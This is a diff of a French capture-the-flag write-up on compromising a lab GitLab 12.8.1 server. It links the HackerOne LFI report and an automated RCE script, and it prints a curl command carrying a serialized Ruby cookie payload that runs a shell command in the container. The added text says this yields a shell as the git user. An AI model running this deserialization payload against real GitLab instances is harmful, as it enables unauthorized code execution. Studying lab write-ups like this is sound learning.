@@ -142,6 +142,8 @@ squidclient -h 192.168.1.19 mgr:fqdncache
 
 ### Version 12.8.1 LFI
 Première étape est de se créer un compte sur le Gitlab. 
+
+![Création de ocmpte gitlab](https://i.imgur.com/SfA1Bhs.png)
 Ensuite, il faut aller vérifier la version du Gitlab pour vérifier les différents exploits.
 
 Certains exploit sont 100% automatisés mais voici un compte rendu de l'exploit utilisé : [https://hackerone.com/reports/827052](https://hackerone.com/reports/827052) (Bounty de 20 000$ versé par Gitlab)
@@ -229,7 +231,7 @@ Une fois le cookie crée :
 curl -k -x http://192.168.1.39:3128 'http://gitlab.laboratory.ctf/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06"
 ```
 
-
+Nous avons donc un shell en tant que `git`sur le container gitlab. Pour vérifier que nous sommes dans un container, on peut vérifier les cgroups du premier processus ou de self.
 
 **Deuxième solution pour le RCE**
 Il existe un script qui automatise toute la partie vue ci-dessus :  [https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE) 
@@ -290,6 +292,8 @@ irb(main):021:0> u.save!
 => true     
 
 ```
+
+
 
 ## Container Lateral Escapce
 
